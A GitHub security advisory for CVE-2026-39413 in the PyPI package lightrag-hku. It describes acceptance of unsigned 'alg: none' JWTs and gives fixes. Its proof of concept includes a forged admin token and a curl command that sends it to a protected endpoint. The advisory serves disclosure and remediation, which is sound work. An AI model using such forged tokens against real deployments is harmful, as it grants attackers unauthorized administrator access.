# [M] lightrag-hku: JWT Algorithm Confusion Vulnerability 

## Summary
Severity: Medium
Advisory: GHSA-8ffj-4hx4-9pgf
CVE: CVE-2026-39413
CWE: CWE-347
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-8ffj-4hx4-9pgf
Type: github-advisory

## Affected
- PyPI: `lightrag-hku` — affected >=0 <1.4.14

## Details
## Summary
The LightRAG API is vulnerable to a JWT algorithm confusion attack where an attacker can forge tokens by specifying 'alg': 'none' in the JWT header. Since the `jwt.decode()` call does not explicitly deny the 'none' algorithm, a crafted token without a signature will be accepted as valid, leading to unauthorized access.

## Details
In `lightrag/api/auth.py` at line 128, the `validate_token` method calls:

```python
payload = jwt.decode(token, self.secret, algorithms=[self.algorithm])
```

This allows any algorithm listed in the token's header to be processed, including 'none'. The code does not explicitly specify that 'none' is not allowed, making it possible for an attacker to bypass authentication.

## PoC
An attacker can generate a JWT with the following structure:

```json
{
  "header": {
    "alg": "none",
    "typ": "JWT"
  },
  "payload": {
    "sub": "admin",
    "exp": 1700000000,
    "role": "admin"
  }
}
```

Then send a request like:

```bash
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMCwicm9sZSI6ImFkbWluIn0." http://localhost:8000/api/protected-endpoint
```

## Impact
An attacker can impersonate any user, including administrators, by forging a JWT with 'alg': 'none', gaining full access to protected resources without needing valid credentials.

## Recommended Fix
Explicitly specify allowed algorithms and exclude 'none'. Modify the `validate_token` method to:

```python
allowed_algorithms = [self.algorithm] if self.algorithm != 'none' else ['HS256', 'HS384', 'HS512']
payload = jwt.decode(token, self.secret, algorithms=allowed_algorithms)
```

Or better yet, hardcode the expected algorithm(s):

```python
payload = jwt.decode(token, self.secret, algorithms=['HS256'])
```

## References
- https://github.com/HKUDS/LightRAG/security/advisories/GHSA-8ffj-4hx4-9pgf
- https://nvd.nist.gov/vuln/detail/CVE-2026-39413
- https://github.com/HKUDS/LightRAG/commit/728f2e54509d93e0a44f929c7f83f2c88d6d291b
- https://github.com/HKUDS/LightRAG
